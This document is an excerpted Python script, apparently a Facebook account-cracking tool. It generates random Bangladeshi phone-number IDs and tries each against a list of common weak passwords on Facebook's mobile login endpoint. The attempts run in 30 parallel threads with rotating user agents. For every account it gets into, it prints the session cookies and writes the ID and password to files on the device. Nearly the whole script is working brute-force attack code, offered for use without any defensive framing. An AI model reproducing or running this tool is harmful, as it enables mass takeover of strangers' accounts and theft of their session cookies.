...
def fuck():
        ...
        if sadia in '1':
            rndm()
         #   os.system("xdg-open https://chat.whatsapp.com/DZC8fdXVOG35oSPfacAjay")
def clear():
        os.system('clear')
        print(logo)
def linex():
...
def rndm():
        clear()
        print(f'{K} SIM CODE  {R}:{G} 017,018,019');linex()
        code = input(f'{K} CHOOSE  {R}:{G} ')
        clear()
        print(f'{K} CRACK ID  {R}:{G} 2000,4000,6000');linex()
        limit = int(input(f'{K} CHOOSE  {R}:{G} '))
        linex()
        for __tanim__ in range(limit):
                _Xx_ = ''.join(random.choice(string.digits) for _ in range(8))
                user.append(_Xx_)
        with tred(max_workers=30) as _TANIM_:
                tl = str(len(user))
                clear()
                ...
                for love in user:
                        ids = code + love 
                        pasx = [ids,love,ids[:8],ids[:7],ids[:6],love[1:],love[2:],'sadiya','jannat','sumaiya','bangla','tanisha','@@@###','@#@#@#','203040','405060','708090']
                        _TANIM_.submit(sex,ids,pasx)
        print('')
        linex()
...
def sex(ids,pasx):
        global loop,ok
        sys.stdout.write(f'\r\r\033[38;5;48m➤{G}[POWER-XD]({GR}{loop}\033[38;5;48m)|➤|OK:➤\033[38;5;46m{len(ok)}')
        sys.stdout.flush()
        try:
                for ps in pasx:
                        session = requests.Session()
                        pro = random.choice(ugen)
                        TANIMvai = session.get('https://m.facebook.com').text
                        tanimxx = {
                            "lsd":re.search('name="lsd" value="(.*?)"', str(TANIMvai)).group(1),
                        "jazoest":re.search('name="jazoest" value="(.*?)"', str(TANIMvai)).group(1),
                        "m_ts":re.search('name="m_ts" value="(.*?)"', str(TANIMvai)).group(1),
                        "li":re.search('name="li" value="(.*?)"', str(TANIMvai)).group(1),
                        "try_number":"0",
    ...
    # 'cookie': 'datr=y2QtZfK9fqrCNm5tEG-uMmrz; sb=0GQtZZ-OG9lKxYmQ4PlKzL5E; locale=en_GB; vpd=v1%3B836x427x1.4347375631332397; wl_cbv=v2%3Bclient_version%3A2340%3Btimestamp%3A1698169919; dpr=1.5774177312850952; m_pixel_ratio=1.4347375631332397; wd=503x983; fr=0Uao7fN1QgdkjuTsd.AWVauLN5xbMAaGpXVQxW6iP4NB8.BlN04F.d8.AAA.0.0.BlOK0v.AWW-V9qbL-c',
    'dpr': '1.6875',
    ...
    'user-agent': pro,
                        lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=tanimxx,headers=bhoot).text
                        tanim=session.cookies.get_dict().keys()
                        if 'c_user' in tanim:
                                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                                uid = re.findall('c_user=(.*);xs', coki)[0]
                                print(f'\r\r{G}[POWER-OK] {uid} ➤ {ps}')
                                print(f"\r\033[38;5;46mCOOKIES=[⚽]: {coki}\33[1;36m")
                                open('/sdcard/TANIM-OK.txt','a').write(uid+'|'+ps+'\n')
                                ok.append(uid)
                                break
                        elif 'checkpoint' in tanim:
                                print(f'\r\r {R}[POWER-CP] {uid} | {ps}')
                                open('/sdcard/TANIM-CP.txt','a').write(uid+'|'+ps+'\n')
                                cp.append(uid)
                                break
                        else:continue
                loop+=1
...
fuck()
#https://free.facebook.com/login/device-based/regular/login/?refsrc
